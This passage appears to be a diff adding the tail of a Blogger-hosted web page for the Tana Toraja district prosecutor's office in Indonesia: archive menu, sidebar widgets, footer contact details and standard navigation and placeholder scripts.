+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2021/05/'>Mei (1)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2021/04/'>April (3)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2021/03/'>Maret (7)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2021/02/'>Februari (3)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2021/01/'>Januari (4)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2020/12/'>Desember (5)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2020/11/'>November (2)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2020/10/'>Oktober (2)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2020/08/'>Agustus (7)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2020/07/'>Juli (1)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2020/06/'>Juni (2)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2020/05/'>Mei (2)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2020/04/'>April (5)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2020/03/'>Maret (3)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2020/02/'>Februari (5)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2019/12/'>Desember (1)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2019/11/'>November (3)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2019/10/'>Oktober (5)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2019/09/'>September (4)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2019/08/'>Agustus (5)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2019/07/'>Juli (9)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2019/06/'>Juni (1)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2019/05/'>Mei (8)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2019/04/'>April (8)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2019/03/'>Maret (2)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2019/02/'>Februari (1)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2019/01/'>Januari (3)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2018/12/'>Desember (5)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2018/11/'>November (3)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2018/10/'>Oktober (10)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2018/09/'>September (3)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2018/08/'>Agustus (11)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2018/07/'>Juli (14)</option>
+<option value='https://kejari-tanatoraja.kejaksaan.go.id//2018/06/'>Juni (2)</option>
+</select>
+</div>
+</div>
+<div class='clear'></div>
+</div>
+</div><div class='widget Attribution' data-version='1' id='Attribution1'>
+<div class='widget-content' style='text-align: center;'>
+Diberdayakan oleh <a href='https://www.blogger.com' target='_blank'>Blogger</a>.
+</div>
+<div class='clear'></div>
+</div>
+<div class='widget Label' data-version='1' id='Label3'>
+<h2>Label</h2>
+<div class='widget-content list-label-widget-content'>
+<ul>
+<li>
+<a dir='ltr' href='https://kejari-tanatoraja.kejaksaan.go.id//search/label/Berita'>Berita</a>
+</li>
+<li>
+<a dir='ltr' href='https://kejari-tanatoraja.kejaksaan.go.id//search/label/Kegaiatan'>Kegaiatan</a>
+</li>
+<li>
+<a dir='ltr' href='https://kejari-tanatoraja.kejaksaan.go.id//search/label/Kegaitan'>Kegaitan</a>
+</li>
+<li>
+<a dir='ltr' href='https://kejari-tanatoraja.kejaksaan.go.id//search/label/Kegiatan'>Kegiatan</a>
+</li>
+<li>
+<a dir='ltr' href='https://kejari-tanatoraja.kejaksaan.go.id//search/label/tipikor'>tipikor</a>
+</li>
+</ul>
+<div class='clear'></div>
+</div>
+</div><div class='widget Navbar' data-version='1' id='Navbar1'><script type="text/javascript">
+    function setAttributeOnload(object, attribute, val) {
+      if(window.addEventListener) {
+        window.addEventListener('load',
+          function(){ object[attribute] = val; }, false);
+      } else {
+        window.attachEvent('onload', function(){ object[attribute] = val; });
+      }
+    }
+  </script>
+<div id="navbar-iframe-container"></div>
+<script type="text/javascript" src="https://apis.google.com/js/platform.js"></script>
+<script type="text/javascript">
+      gapi.load("gapi.iframes:gapi.iframes.style.bubble", function() {
+        if (gapi.iframes && gapi.iframes.getContext) {
+          gapi.iframes.getContext().openChild({
+              url: 'https://www.blogger.com/navbar/2128310195421907157?pa\x3d625444627383061687\x26origin\x3dhttps://kejari-tanatoraja.kejaksaan.go.id/',
+              where: document.getElementById("navbar-iframe-container"),
+              id: "navbar-iframe"
+          });
+        }
+      });
+    </script><script type="text/javascript">
+(function() {
+var script = document.createElement('script');
+script.type = 'text/javascript';
+script.src = '//pagead2.googlesyndication.com/pagead/js/google_top_exp.js';
+var head = document.getElementsByTagName('head')[0];
+if (head) {
+head.appendChild(script);
+}})();
+</script>
+</div><div class='widget HTML' data-version='1' id='HTML1'>
+<h2 class='title'>Mars Adhyaksa</h2>
+<div class='widget-content'>
+<iframe width="300" height="215" src="https://www.youtube.com/embed/SG-Jad0s03g" frameborder="0" allowfullscreen></iframe>
+</div>
+<div class='clear'></div>
+</div><div class='widget HTML' data-version='1' id='HTML3'>
+<h2 class='title'>Kenali Hukum, Jauhi Hukuman</h2>
+<div class='widget-content'>
+<iframe width="300" height="215" src="https://www.youtube.com/embed/5jQOK8yM2yA" frameborder="0" allowfullscreen></iframe>
+</div>
+<div class='clear'></div>
+</div></div>
+</div>
+<!-- end of sidebar -->
+<div class='line-bottomnbt'></div>
+</div>
+<!-- end of main-content-inner -->
+</div>
+<!-- end of main-content -->
+</div>
+<!-- end of container -->
+<footer id='wrapper-footernbt'>
+<div id='footernbt'>
+<div class='footer-widget-areanbt footer-widget-areanbt-1'>
+<div class='footersecnbt section' id='footersecnbt1'><div class='widget LinkList' data-version='1' id='LinkList2'>
+<h2>Link Terkait</h2>
+<div class='widget-content'>
+<ul>
+<li><a href='http://http://tanatorajakab.go.id/'>Pemerintah Kabupaten Tana Toraja</a></li>
+<li><a href='http://www.pn-makale.go.id/'>Pengadilan Negeri Makale</a></li>
+<li><a href='http://kejati-sulsel.go.id'>Kejati Sulawesi Selatan</a></li>
+<li><a href='http://www.kejaksaan.go.id'>Kejaksaan RI</a></li>
+</ul>
+<div class='clear'></div>
+</div>
+</div></div>
+</div>
+<div class='footer-widget-areanbt footer-widget-areanbt-2' style='color:#f0d8d5'>
+<div class='footersecnbt section' id='footersecnbt2'><div class='widget Image' data-version='1' id='Image2'>
+<h2>Anti Korupsi</h2>
+<div class='widget-content'>
+<img alt='Anti Korupsi' height='150' id='Image2_img' src='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjHSQyQtPnLOz3AIWE5nwyNJNiVb1EcwxMI1Xyk9EDLK9NigETFDnpapa1LN3yFCIASUwA3zzS8gOXeDYCW5tyy0Oyr6fANv09TswXpxhfNEiyGNlHEUFTFqDC44cDUcHsxL_p4JRlyCVQ/s150/jaksa.gif' width='108'/>
+<br/>
+<span class='caption'>Jika Menemukan Indikasi Tindak Pidana Korupsi Hubungi Kami</span>
+</div>
+<div class='clear'></div>
+</div></div>
+</div>
+<div class='footer-widget-areanbt footer-widget-areanbt-3' style='color:#f0d8d5'>
+<div class='footersecnbt section' id='footersecnbt3'><div class='widget Text' data-version='1' id='Text1'>
+<h2 class='title'>Informasi</h2>
+<div class='widget-content'>
+Alamat          : Jl. Pongtiku No. 6 Makale, Kabupaten Tana Toraja, Sulawesi- Selatan 91811<br />No. Telp        : 0432-22025<br />Fax                 : 0432-22025<br />Email : kejari.tanatoraja@kejaksaan.go.id<br />
+</div>
+<div class='clear'></div>
+</div></div>
+</div>
+</div>
+<div class='footer-signaturenbt'>
+<div class='footer-signature-contentnbt'>
+<!-- Do not edit or remove credits without our permission: newbloggerthemes.com -->
+<p>Copyright &#169; <script type='text/javascript'>var creditsyear = new Date();document.write(creditsyear.getFullYear());</script>
+<a href='https://kejari-tanatoraja.kejaksaan.go.id//'>KEJAKSAAN NEGERI TANA TORAJA</a><br/>Isi situs bersifat informatif bukan merupakan legal opinion dari KEJAKSAAN NEGERI TANA TORAJA.<br/> Apabila terdapat data elektronik based yang berbeda dengan data resmi paper, maka yang menjadi acuan adalah data resmi paper based.<br/> ===========================================================================================================================================</p>
+</div>
+</div>
+</footer>
+<!-- end of wrapper-footer -->
+<script type='text/javascript'>
+//<![CDATA[
+
+/* Placeholders.js v3.0.2 */
+(function(t){"use strict";function e(t,e,r){return t.addEventListener?t.addEventListener(e,r,!1):t.attachEvent?t.attachEvent("on"+e,r):void 0}function r(t,e){var r,n;for(r=0,n=t.length;n>r;r++)if(t[r]===e)return!0;return!1}function n(t,e){var r;t.createTextRange?(r=t.createTextRange(),r.move("character",e),r.select()):t.selectionStart&&(t.focus(),t.setSelectionRange(e,e))}function a(t,e){try{return t.type=e,!0}catch(r){return!1}}t.Placeholders={Utils:{addEventListener:e,inArray:r,moveCaret:n,changeType:a}}})(this),function(t){"use strict";function e(){}function r(){try{return document.activeElement}catch(t){}}function n(t,e){var r,n,a=!!e&&t.value!==e,u=t.value===t.getAttribute(V);return(a||u)&&"true"===t.getAttribute(D)?(t.removeAttribute(D),t.value=t.value.replace(t.getAttribute(V),""),t.className=t.className.replace(R,""),n=t.getAttribute(F),parseInt(n,10)>=0&&(t.setAttribute("maxLength",n),t.removeAttribute(F)),r=t.getAttribute(P),r&&(t.type=r),!0):!1}function a(t){var e,r,n=t.getAttribute(V);return""===t.value&&n?(t.setAttribute(D,"true"),t.value=n,t.className+=" "+I,r=t.getAttribute(F),r||(t.setAttribute(F,t.maxLength),t.removeAttribute("maxLength")),e=t.getAttribute(P),e?t.type="text":"password"===t.type&&M.changeType(t,"text")&&t.setAttribute(P,"password"),!0):!1}function u(t,e){var r,n,a,u,i,l,o;if(t&&t.getAttribute(V))e(t);else for(a=t?t.getElementsByTagName("input"):b,u=t?t.getElementsByTagName("textarea"):f,r=a?a.length:0,n=u?u.length:0,o=0,l=r+n;l>o;o++)i=r>o?a[o]:u[o-r],e(i)}function i(t){u(t,n)}function l(t){u(t,a)}function o(t){return function(){m&&t.value===t.getAttribute(V)&&"true"===t.getAttribute(D)?M.moveCaret(t,0):n(t)}}function c(t){return function(){a(t)}}function s(t){return function(e){return A=t.value,"true"===t.getAttribute(D)&&A===t.getAttribute(V)&&M.inArray(C,e.keyCode)?(e.preventDefault&&e.preventDefault(),!1):void 0}}function d(t){return function(){n(t,A),""===t.value&&(t.blur(),M.moveCaret(t,0))}}function g(t){return function(){t===r()&&t.value===t.getAttribute(V)&&"true"===t.getAttribute(D)&&M.moveCaret(t,0)}}function v(t){return function(){i(t)}}function p(t){t.form&&(T=t.form,"string"==typeof T&&(T=document.getElementById(T)),T.getAttribute(U)||(M.addEventListener(T,"submit",v(T)),T.setAttribute(U,"true"))),M.addEventListener(t,"focus",o(t)),M.addEventListener(t,"blur",c(t)),m&&(M.addEventListener(t,"keydown",s(t)),M.addEventListener(t,"keyup",d(t)),M.addEventListener(t,"click",g(t))),t.setAttribute(j,"true"),t.setAttribute(V,x),(m||t!==r())&&a(t)}var b,f,m,h,A,y,E,x,L,T,N,S,w,B=["text","search","url","tel","email","password","number","textarea"],C=[27,33,34,35,36,37,38,39,40,8,46],k="#ccc",I="placeholdersjs",R=RegExp("(?:^|\\s)"+I+"(?!\\S)"),V="data-placeholder-value",D="data-placeholder-active",P="data-placeholder-type",U="data-placeholder-submit",j="data-placeholder-bound",q="data-placeholder-focus",z="data-placeholder-live",F="data-placeholder-maxlength",G=document.createElement("input"),H=document.getElementsByTagName("head")[0],J=document.documentElement,K=t.Placeholders,M=K.Utils;if(K.nativeSupport=void 0!==G.placeholder,!K.nativeSupport){for(b=document.getElementsByTagName("input"),f=document.getElementsByTagName("textarea"),m="false"===J.getAttribute(q),h="false"!==J.getAttribute(z),y=document.createElement("style"),y.type="text/css",E=document.createTextNode("."+I+" { color:"+k+"; }"),y.styleSheet?y.styleSheet.cssText=E.nodeValue:y.appendChild(E),H.insertBefore(y,H.firstChild),w=0,S=b.length+f.length;S>w;w++)N=b.length>w?b[w]:f[w-b.length],x=N.attributes.placeholder,x&&(x=x.nodeValue,x&&M.inArray(B,N.type)&&p(N));L=setInterval(function(){for(w=0,S=b.length+f.length;S>w;w++)N=b.length>w?b[w]:f[w-b.length],x=N.attributes.placeholder,x?(x=x.nodeValue,x&&M.inArray(B,N.type)&&(N.getAttribute(j)||p(N),(x!==N.getAttribute(V)||"password"===N.type&&!N.getAttribute(P))&&("password"===N.type&&!N.getAttribute(P)&&M.changeType(N,"text")&&N.setAttribute(P,"password"),N.value===N.getAttribute(V)&&(N.value=x),N.setAttribute(V,x)))):N.getAttribute(D)&&(n(N),N.removeAttribute(V));h||clearInterval(L)},100)}M.addEventListener(t,"beforeunload",function(){K.disable()}),K.disable=K.nativeSupport?e:i,K.enable=K.nativeSupport?e:l}(this);
+
+//]]>
+</script>
+<script type='text/javascript'>
+//<![CDATA[
+
+/* scroll-to-top.js v1.0 */
+jQuery( function () {
+
+	jQuery( 'body' ).prepend( '<div class="scroll-topnbt"></div>');
+
+	var scrollButtonEl = jQuery( '.scroll-topnbt' );
+
+	scrollButtonEl.hide();
+
+	jQuery( window ).scroll( function () {
+		if ( jQuery( window ).scrollTop() < 20 ) {
+			jQuery( '.scroll-topnbt' ).fadeOut();
+		} else {
+			jQuery( '.scroll-topnbt' ).fadeIn();
+		}
+	} );
+
+	scrollButtonEl.click( function () {
+		jQuery( "html, body" ).animate( { scrollTop: 0 }, 300 );
+		return false;
+	} );
+
+} );
+
+//]]>
+</script>
+<script type='text/javascript'>
+//<![CDATA[
+
+/* Menubox.js v1.0 */
+jQuery(document).ready(function($) {
+		var stickyHeaderTop = $('.menu-boxnbt').offset().top;
+		$(window).scroll(function(){
+		    if( $(window).scrollTop() > stickyHeaderTop ) {
+			$('.menu-boxnbt').addClass("sticky-navnbt");
+		    } else {
+			$('.menu-boxnbt').removeClass("sticky-navnbt");
+		    }
+		});
+});
+
+//]]>
+</script>
+<script type='text/javascript'>
+//<![CDATA[
+
+/**
+ * @preserve SelectNav.js (v. 0.1)
+ * Converts your <ul>/<ol> navigation into a dropdown list for small screens
+ * https://github.com/lukaszfiszer/selectnav.js
+ */
+
+window.selectnav = (function(){
+
+"use strict";
+
+  var selectnav = function(element,options){
+
+    element = document.getElementById(element);
+
+    // return immediately if element doesn't exist
+    if( ! element){
+      return;
+    }
+
+    // return immediately if element is not a list
+    if( ! islist(element) ){
+      return;
+    }
+
+    // add a js class to <html> tag
+    document.documentElement.className += " js";
+
+    // retreive options and set defaults
+    var o = options || {},
+
+      activeclass = o.activeclass || 'active',
+      autoselect = typeof(o.autoselect) === "boolean" ? o.autoselect : true,
+      nested = typeof(o.nested) === "boolean" ? o.nested : true,
+      indent = o.indent || "→",
+      label = o.label || "- MENU -",
+
+      // helper variables
+      level = 0,
+      selected = " selected ";
+
+    // insert the freshly created dropdown navigation after the existing navigation
+    element.insertAdjacentHTML('afterend', parselist(element) );
+
+    var nav = document.getElementById(id());
+
+    // autoforward on click
+    if (nav.addEventListener) {
+      nav.addEventListener('change',goTo);
+    }
+    if (nav.attachEvent) {
+      nav.attachEvent('onchange', goTo);
+    }
+
+    return nav;
+
+    function goTo(e){
+
+      // Crossbrowser issues - http://www.quirksmode.org/js/events_properties.html
+      var targ;
+      if (!e) e = window.event;
+      if (e.target) targ = e.target;
+      else if (e.srcElement) targ = e.srcElement;
+      if (targ.nodeType === 3) // defeat Safari bug
+        targ = targ.parentNode; 
+
+      if(targ.value) window.location.href = targ.value; 
+    }
+
+    function islist(list){
+      var n = list.nodeName.toLowerCase();
+      return (n === 'ul' || n === 'ol');
+    }
+
+    function id(nextId){
+      for(var j=1; document.getElementById('selectnav'+j);j++);
+      return (nextId) ? 'selectnav'+j : 'selectnav'+(j-1);
+    }
+
+    function parselist(list){
+
+      // go one level down
+      level++;
+
+      var length = list.children.length,
+        html = '',
+        prefix = '',
+        k = level-1
+        ;
+
+      // return immediately if has no children
+      if (!length) {
+        return;
+      }
+
+      if(k) {
+        while(k--){
+          prefix += indent;
+        }
+        prefix += " ";
+      }
+
+      for(var i=0; i < length; i++){
+
+        var link = list.children[i].children[0];
+        if(typeof(link) !== 'undefined'){
+          var text = link.innerText || link.textContent;
+          var isselected = '';
+
+          if(activeclass){
+            isselected = link.className.search(activeclass) !== -1 || link.parentElement.className.search(activeclass) !== -1 ? selected : '';
+          }
+
+          if(autoselect && !isselected){
+            isselected = link.href === document.URL ? selected : '';
+          }
+
+          html += '<option value="' + link.href + '" ' + isselected + '>' + prefix + text +'</option>';
+
+          if(nested){
+            var subElement = list.children[i].children[1];
+            if( subElement && islist(subElement) ){
+              html += parselist(subElement);
+            }
+          }
+        }
+      }
+
+      // adds label
+      if(level === 1 && label) {
+        html = '<option value="">' + label + '</option>' + html;
+      }
+
+      // add <select> tag to the top level of the list
+      if(level === 1) {
+        html = '<select class="selectnav" id="'+id(true)+'">' + html + '</select>';
+      }
+
+      // go 1 level up
+      level--;
+
+      return html;
+    }
+
+  };
+
+  return function (element,options) {
+    selectnav(element,options);
+  };
+
+
+})();
+
+//]]>
+</script>
+<script type='text/javascript'>
+//<![CDATA[
+
+jQuery(document).ready(function(){
+
+/* Responzive.js v1.0 */
+selectnav('navnbt');
+selectnav('top-navnbt');
+  
+});
+
+//]]>
+</script>
+<DIV id='footer2' style='background-color:#050505; color:#fdfafa;'>
+<MARQUEE onmouseout='this.start()' onmouseover='this.stop()' scrollamount='4'>Selamat Datang di Website KEJAKSAAN NEGERI TANA TORAJA, Isi situs bersifat informatif bukan merupakan legal opinion dari KEJAKSAAN NEGERI TANA TORAJA. Apabila terdapat data elektronik based yang berbeda dengan data resmi paper, maka yang menjadi acuan adalah data resmi paper based. </MARQUEE>
+</DIV>
+
+<script type="text/javascript" src="https://www.blogger.com/static/v1/widgets/3878540743-widgets.js"></script>
+<script type='text/javascript'>
+window['__wavt'] = 'AOuZoY5YPlxff37dnIasnROl1IsE2YPYkA:1759800806211';_WidgetManager._Init('//www.blogger.com/rearrange?blogID\x3d2128310195421907157','//www.kejari-tanatoraja.go.id/p/gedung-dan-halaman.html','2128310195421907157');
+_WidgetManager._SetDataContext([{'name': 'blog', 'data': {'blogId': '2128310195421907157', 'title': 'KEJAKSAAN NEGERI TANA TORAJA', 'url': 'https://kejari-tanatoraja.kejaksaan.go.id//p/gedung-dan-halaman.html', 'canonicalUrl': 'https://kejari-tanatoraja.kejaksaan.go.id//p/gedung-dan-halaman.html', 'homepageUrl': 'https://kejari-tanatoraja.kejaksaan.go.id//', 'searchUrl': 'https://kejari-tanatoraja.kejaksaan.go.id//search', 'canonicalHomepageUrl': 'https://kejari-tanatoraja.kejaksaan.go.id//', 'blogspotFaviconUrl': 'https://kejari-tanatoraja.kejaksaan.go.id//favicon.ico', 'bloggerUrl': 'https://www.blogger.com', 'hasCustomDomain': true, 'httpsEnabled': false, 'enabledCommentProfileImages': true, 'gPlusViewType': 'FILTERED_POSTMOD', 'adultContent': false, 'analyticsAccountNumber': '', 'encoding': 'UTF-8', 'locale': 'id', 'localeUnderscoreDelimited': 'id', 'languageDirection': 'ltr', 'isPrivate': false, 'isMobile': false, 'isMobileRequest': false, 'mobileClass': '', 'isPrivateBlog': false, 'isDynamicViewsAvailable': true, 'feedLinks': '\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22KEJAKSAAN NEGERI TANA TORAJA - Atom\x22 href\x3d\x22https://kejari-tanatoraja.kejaksaan.go.id//feeds/posts/default\x22 /\x3e\n\x3clink rel\x3d\x22alternate\x22 type\x3d\x22application/rss+xml\x22 title\x3d\x22KEJAKSAAN NEGERI TANA TORAJA - RSS\x22 href\x3d\x22https://kejari-tanatoraja.kejaksaan.go.id//feeds/posts/default?alt\x3drss\x22 /\x3e\n\x3clink rel\x3d\x22service.post\x22 type\x3d\x22application/atom+xml\x22 title\x3d\x22KEJAKSAAN NEGERI TANA TORAJA - Atom\x22 href\x3d\x22https://www.blogger.com/feeds/2128310195421907157/posts/default\x22 /\x3e\n', 'meTag': '', 'adsenseHostId': 'ca-host-pub-1556223355139109', 'adsenseHasAds': false, 'adsenseAutoAds': false, 'boqCommentIframeForm': true, 'loginRedirectParam': '', 'view': '', 'dynamicViewsCommentsSrc': '//www.blogblog.com/dynamicviews/4224c15c4e7c9321/js/comments.js', 'dynamicViewsScriptSrc': '//www.blogblog.com/dynamicviews/1291592d14e91807', 'plusOneApiSrc': 'https://apis.google.com/js/platform.js', 'disableGComments': true, 'interstitialAccepted': false, 'sharing': {'platforms': [{'name': 'Dapatkan link', 'key': 'link', 'shareMessage': 'Dapatkan link', 'target': ''}, {'name': 'Facebook', 'key': 'facebook', 'shareMessage': 'Bagikan ke Facebook', 'target': 'facebook'}, {'name': 'BlogThis!', 'key': 'blogThis', 'shareMessage': 'BlogThis!', 'target': 'blog'}, {'name': 'X', 'key': 'twitter', 'shareMessage': 'Bagikan ke X', 'target': 'twitter'}, {'name': 'Pinterest', 'key': 'pinterest', 'shareMessage': 'Bagikan ke Pinterest', 'target': 'pinterest'}, {'name': 'Email', 'key': 'email', 'shareMessage': 'Email', 'target': 'email'}], 'disableGooglePlus': true, 'googlePlusShareButtonWidth': 0, 'googlePlusBootstrap': '\x3cscript type\x3d\x22text/javascript\x22\x3ewindow.___gcfg \x3d {\x27lang\x27: \x27id\x27};\x3c/script\x3e'}, 'hasCustomJumpLinkMessage': false, 'jumpLinkMessage': 'Baca selengkapnya', 'pageType': 'static_page', 'pageId': '625444627383061687', 'pageName': 'Gedung dan Halaman', 'pageTitle': 'KEJAKSAAN NEGERI TANA TORAJA: Gedung dan Halaman'}}, {'name': 'features', 'data': {}}, {'name': 'messages', 'data': {'edit': 'Edit', 'linkCopiedToClipboard': 'Tautan disalin ke papan klip!', 'ok': 'Oke', 'postLink': 'Tautan Pos'}}, {'name': 'template', 'data': {'name': 'custom', 'localizedName': 'Khusus', 'isResponsive': false, 'isAlternateRendering': false, 'isCustom': true}}, {'name': 'view', 'data': {'classic': {'name': 'classic', 'url': '?view\x3dclassic'}, 'flipcard': {'name': 'flipcard', 'url': '?view\x3dflipcard'}, 'magazine': {'name': 'magazine', 'url': '?view\x3dmagazine'}, 'mosaic': {'name': 'mosaic', 'url': '?view\x3dmosaic'}, 'sidebar': {'name': 'sidebar', 'url': '?view\x3dsidebar'}, 'snapshot': {'name': 'snapshot', 'url': '?view\x3dsnapshot'}, 'timeslide': {'name': 'timeslide', 'url': '?view\x3dtimeslide'}, 'isMobile': false, 'title': 'Gedung dan Halaman', 'description': ' Foto Gedung dan Halaman Kejari Tana Toraja                   ', 'featuredImage': 'https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPNjSRYij9lw22Z3LTRBcRoslHx5Of4XbZSqc9ApVN2InG922ikCg7ZYo-h1wXyYmTKURKD_hBYsgjkemO0VZglpXgx2ZC7BHiZeZyoooj8OmEKfT9Kxb4FENNWz5RXef4WFpvvZOybIg/s320/oke1.jpg', 'url': 'https://kejari-tanatoraja.kejaksaan.go.id//p/gedung-dan-halaman.html', 'type': 'item', 'isSingleItem': true, 'isMultipleItems': false, 'isError': false, 'isPage': true, 'isPost': false, 'isHomepage': false, 'isArchive': false, 'isLabelSearch': false, 'pageId': 625444627383061687}}]);
+_WidgetManager._RegisterWidget('_HeaderView', new _WidgetInfo('Header1', 'headersec', document.getElementById('Header1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_ImageView', new _WidgetInfo('Image4', 'mainblogsec', document.getElementById('Image4'), {'resize': true}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogView', new _WidgetInfo('Blog1', 'mainblogsec', document.getElementById('Blog1'), {'cmtInteractionsEnabled': false, 'lightboxEnabled': true, 'lightboxModuleUrl': 'https://www.blogger.com/static/v1/jsbin/52802623-lbx.js', 'lightboxCssUrl': 'https://www.blogger.com/static/v1/v-css/828616780-lightbox_bundle.css'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_ImageView', new _WidgetInfo('Image3', 'sidebarrightnbt', document.getElementById('Image3'), {'resize': true}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_ImageView', new _WidgetInfo('Image1', 'sidebarrightnbt', document.getElementById('Image1'), {'resize': false}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML2', 'sidebarrightnbt', document.getElementById('HTML2'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_StatsView', new _WidgetInfo('Stats1', 'sidebarrightnbt', document.getElementById('Stats1'), {'title': 'Total Pengunjung', 'showGraphicalCounter': true, 'showAnimatedCounter': false, 'showSparkline': false, 'statsUrl': '//www.kejari-tanatoraja.go.id/b/stats?style\x3dBLACK_TRANSPARENT\x26timeRange\x3dALL_TIME\x26token\x3dAPq4FmBCmfiZ_Hrpz-e6f44ZKt2VkS8mLCn9SfiI-5nGunBFhixJapSIN0f1YEzyy9l3qwjvJfM_amM6XPFzIFbufsRE0Tf4Gw'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_BlogArchiveView', new _WidgetInfo('BlogArchive2', 'sidebarrightnbt', document.getElementById('BlogArchive2'), {'languageDirection': 'ltr', 'loadingMessage': 'Memuat\x26hellip;'}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_AttributionView', new _WidgetInfo('Attribution1', 'sidebarrightnbt', document.getElementById('Attribution1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_LabelView', new _WidgetInfo('Label3', 'sidebarrightnbt', document.getElementById('Label3'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_NavbarView', new _WidgetInfo('Navbar1', 'sidebarrightnbt', document.getElementById('Navbar1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML1', 'sidebarrightnbt', document.getElementById('HTML1'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_HTMLView', new _WidgetInfo('HTML3', 'sidebarrightnbt', document.getElementById('HTML3'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_LinkListView', new _WidgetInfo('LinkList2', 'footersecnbt1', document.getElementById('LinkList2'), {}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_ImageView', new _WidgetInfo('Image2', 'footersecnbt2', document.getElementById('Image2'), {'resize': true}, 'displayModeFull'));
+_WidgetManager._RegisterWidget('_TextView', new _WidgetInfo('Text1', 'footersecnbt3', document.getElementById('Text1'), {}, 'displayModeFull'));
+</script>
+</body>
+</html>
